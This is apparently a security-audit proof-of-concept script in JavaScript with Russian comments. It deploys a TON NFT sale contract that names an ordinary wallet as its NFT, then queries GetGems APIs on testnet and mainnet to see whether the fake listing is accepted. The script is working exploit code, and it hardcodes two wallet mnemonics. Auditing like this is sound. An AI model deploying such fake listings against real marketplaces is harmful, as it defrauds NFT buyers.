/**
 * PoC HYP-05: Fake NFT listing — нет TEP-62 on-chain validation
 *
 * Деплоим sale contract с nft_address = attacker.wallet (НЕ NFT-контракт).
 * Проверяем: показывает ли GetGems API этот листинг как валидный?
 *
 * Если бэкенд возвращает листинг → HYP-05 CONFIRMED (off-chain защиты нет).
 * Если бэкенд отклоняет → есть off-chain митигация → downgrade до High.
 *
 * Запуск: node 02-fake-nft-listing/poc-hyp05.js
 */
const { mnemonicToWalletKey } = require('../nft-contracts/node_modules/@ton/crypto');
const { WalletContractV4, TonClient, internal, toNano, Address, beginCell, contractAddress, Cell } = require('../nft-contracts/node_modules/@ton/ton');
const https = require('https');

const client = new TonClient({
  endpoint: 'https://testnet.toncenter.com/api/v2/jsonRPC',
  apiKey: '',
});

const AUDITOR_MNEMONIC = 'wave tilt cause mechanic coral deer together odor gravity glue slogan equip normal post vehicle more explain suffer shy clutch canvas profit worry piano';
const ATTACKER_MNEMONIC = 'asthma black design brick oxygen cat that potato nurse umbrella quote snack bag color walnut jump stem cloth kit sand volcano secret cloth better';

const FULL_PRICE = toNano('0.05');
const FEE_PERCENT = 0.025;
const ROYALTY_PERCENT = 0;
const DEPLOY_VALUE = toNano('0.05');

const MARKETPLACE_FEE_ADDRESS = Address.parse('EQDDuxx7sa3Dt2GE85a0sIHp4GVoa7OKbAanfo3co9H-h06d');

const NftFixPriceSaleV4R1CodeBoc = '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';
const SALE_CODE_CELL = Cell.fromBase64(NftFixPriceSaleV4R1CodeBoc);

function sleep(ms) { return new Promise(r => setTimeout(r, ms)); }
function formatTON(n) { return (Number(n) / 1e9).toFixed(6); }

function httpPost(hostname, path, body) {
  return new Promise((res, rej) => {
    const d = JSON.stringify(body);
    const req = https.request({ hostname, path, method: 'POST', headers: { 'Content-Type': 'application/json', 'Content-Length': d.length } }, r => {
      let s = ''; r.on('data', c => s += c); r.on('end', () => res(JSON.parse(s)));
    });
    req.on('error', rej); req.write(d); req.end();
  });
}

function httpGet(url) {
  return new Promise((res, rej) => {
    https.get(url, { headers: { 'Accept': 'application/json' } }, r => {
      let d = ''; r.on('data', c => d += c); r.on('end', () => {
        try { res(JSON.parse(d)); } catch(e) { res({ raw: d }); }
      });
    }).on('error', rej);
  });
}

async function withRetry(fn, label, maxRetries = 5) {
  for (let i = 1; i <= maxRetries; i++) {
    try { return await fn(); } catch (e) {
      const is429 = e.message?.includes('429') || e.message?.includes('Too Many');
      if (i < maxRetries) { await sleep(is429 ? 2000 * i : 1000); continue; }
      throw e;
    }
  }
}

function buildSaleDataCell(opts) {
  const feePercentInt = Math.floor(opts.feePercent * 100_000);
  const royaltyPercentInt = Math.floor(opts.royaltyPercent * 100_000);
  return beginCell()
    .storeBit(0)
    .storeAddress(opts.marketplaceAddress)
    .storeAddress(opts.nftOwnerAddress)
    .storeCoins(opts.fullPrice)
    .storeUint(0, 32)
    .storeUint(0, 64)
    .storeRef(beginCell()
      .storeAddress(opts.marketplaceFeeAddress)
      .storeAddress(opts.royaltyAddress)
      .storeUint(feePercentInt, 17)
      .storeUint(royaltyPercentInt, 17)
      .storeAddress(opts.nftAddress)
      .storeUint(Math.floor(Date.now() / 1000), 32)
      .endCell())
    .storeDict(null)
    .storeBit(0)
    .endCell();
}

async function checkGetGemsAPI(saleAddr) {
  const raw = saleAddr.toRawString();
  const testnetAddr = saleAddr.toString({ bounceable: true, testOnly: true });
  console.log('  Проверяем GetGems API...');

  // 1. tonapi.io/v2/nfts/{addr}/sale
  try {
    const r1 = await httpGet(`https://testnet.tonapi.io/v2/blockchain/accounts/${raw}`);
    console.log('  tonapi account status:', r1.status ?? r1.error ?? JSON.stringify(r1).substring(0, 100));
  } catch (e) { console.log('  tonapi account err:', e.message); }

  await sleep(500);

  // 2. GetGems GraphQL — проверяем листинг
  const gql = {
    query: `query { nftItemByAddress(address: "${testnetAddr}") { address owner { address } sale { address } } }`
  };
  try {
    const r2 = await httpPost('api.testnet.getgems.io', '/graphql', gql);
    console.log('  GetGems GraphQL (testnet):', JSON.stringify(r2).substring(0, 300));
  } catch (e) { console.log('  GetGems testnet GraphQL err:', e.message); }

  await sleep(500);

  // 3. GetGems mainnet API (нет testnet — проверяем реакцию)
  try {
    const r3 = await httpPost('api.getgems.io', '/graphql', gql);
    console.log('  GetGems GraphQL (mainnet):', JSON.stringify(r3).substring(0, 300));
  } catch (e) { console.log('  GetGems mainnet GraphQL err:', e.message); }

  await sleep(500);

  // 4. NFT address проверка через GetGems — fake nft_address индексируется?
  const nftAddr = Address.parse('0:af3c0927c294fd6bd752082b45fd17518766ecb019ae381346d216a634be44b8'); // attacker wallet
  const gql2 = {
    query: `query { nftItemByAddress(address: "${nftAddr.toString({bounceable:true, testOnly:true})}") { address sale { address price { value } } } }`
  };
  try {
    const r4 = await httpPost('api.testnet.getgems.io', '/graphql', gql2);
    console.log('  GetGems: attacker wallet as NFT:', JSON.stringify(r4).substring(0, 300));
  } catch (e) { console.log('  GetGems attacker-as-nft err:', e.message); }
}

async function main() {
  console.log('╔══════════════════════════════════════════════════════════════╗');
  console.log('║  PoC HYP-05: Fake NFT listing — TEP-62 validation bypass    ║');
  console.log('╚══════════════════════════════════════════════════════════════╝\n');

  const words1 = AUDITOR_MNEMONIC.trim().split(/\s+/);
  const key1 = await mnemonicToWalletKey(words1);
  const auditorWallet = WalletContractV4.create({ publicKey: key1.publicKey, workchain: 0 });
  console.log('[Аудитор]  ', auditorWallet.address.toString({ testOnly: true, bounceable: true }));

  const words2 = ATTACKER_MNEMONIC.trim().split(/\s+/);
  const key2 = await mnemonicToWalletKey(words2);
  const attackerWallet = WalletContractV4.create({ publicKey: key2.publicKey, workchain: 0 });
  console.log('[Атакующий]', attackerWallet.address.toString({ testOnly: true, bounceable: true }));
  console.log('');

  // Fake NFT = attacker wallet address
  const fakeNftAddress = attackerWallet.address;
  console.log('[!] fake nft_address =', fakeNftAddress.toString({ testOnly: true, bounceable: true }));
  console.log('    (обычный кошелёк — НЕ TEP-62 NFT контракт)\n');

  const saleData = buildSaleDataCell({
    marketplaceAddress: auditorWallet.address,
    nftOwnerAddress: auditorWallet.address,
    fullPrice: FULL_PRICE,
    feePercent: FEE_PERCENT,
    royaltyPercent: ROYALTY_PERCENT,
    marketplaceFeeAddress: MARKETPLACE_FEE_ADDRESS,
    royaltyAddress: auditorWallet.address,
    nftAddress: fakeNftAddress,
  });

  const saleAddr = contractAddress(0, { code: SALE_CODE_CELL, data: saleData });
  console.log('[Sale contract]');
  console.log('  testnet:', saleAddr.toString({ bounceable: true, testOnly: true }));
  console.log('  raw:    ', saleAddr.toRawString());
  console.log('');

  // Проверяем — уже задеплоен?
  const existingState = await withRetry(
    () => client.getContractState(saleAddr),
    'check-existing'
  );

  if (existingState.state === 'active') {
    console.log('[!] Sale contract уже активен (предыдущий деплой). Пропускаем деплой.\n');
  } else {
    console.log('[1] Деплой sale contract с fake nft_address...');
    const contract = client.open(auditorWallet);
    const seqno = await withRetry(() => contract.getSeqno(), 'seqno');
    console.log('    seqno:', seqno);
    await withRetry(
      () => contract.sendTransfer({
        seqno,
        secretKey: key1.secretKey,
        messages: [internal({
          to: saleAddr,
          value: DEPLOY_VALUE,
          bounce: false,
          init: { code: SALE_CODE_CELL, data: saleData },
        })],
      }),
      'deploy'
    );
    console.log('    TX отправлена, ждём 15s...');
    await sleep(15000);

    const st = await withRetry(() => client.getContractState(saleAddr), 'check-deploy');
    console.log('    state:', st.state, '| balance:', formatTON(BigInt(st.balance || '0')), 'TON');
  }
  console.log('');

  // get_fix_price_data_v4
  console.log('[2] Чтение состояния sale contract...');
  try {
    await sleep(800);
    const r = await withRetry(
      () => client.runMethod(saleAddr, 'get_fix_price_data_v4'),
      'getter'
    );
    const isComplete = r.stack.readNumber();
    console.log('    is_complete:', isComplete !== 0 ? 'true (1)' : 'false (0)');
  } catch (e) {
    console.log('    get_fix_price_data_v4 err:', e.message);
  }
  console.log('');

  // Проверяем GetGems API
  console.log('[3] Проверка GetGems API/индексатора...');
  await checkGetGemsAPI(saleAddr);
  console.log('');

  console.log('╔══════════════════════════════════════════════════════════════╗');
  console.log('║  ИТОГ:                                                       ║');
  console.log('║  Sale contract с fake nft_address задеплоен.                 ║');
  console.log('║  Проверь вручную:                                            ║');
  console.log('╚══════════════════════════════════════════════════════════════╝');
  console.log('');
  console.log('  1. GetGems testnet UI: https://testnet.getgems.io/nft/' +
    fakeNftAddress.toString({ bounceable: true, testOnly: false }));
  console.log('  2. Покажет ли он "продаётся за ' + formatTON(FULL_PRICE) + ' TON"?');
  console.log('  3. Sale contract explorer:');
  console.log('     https://testnet.tonscan.org/address/' + saleAddr.toRawString());
}

main()
  .then(() => { console.log('\n=== DONE ==='); process.exit(0); })
  .catch(e => { console.error('\nFATAL:', e.message); process.exit(1); });
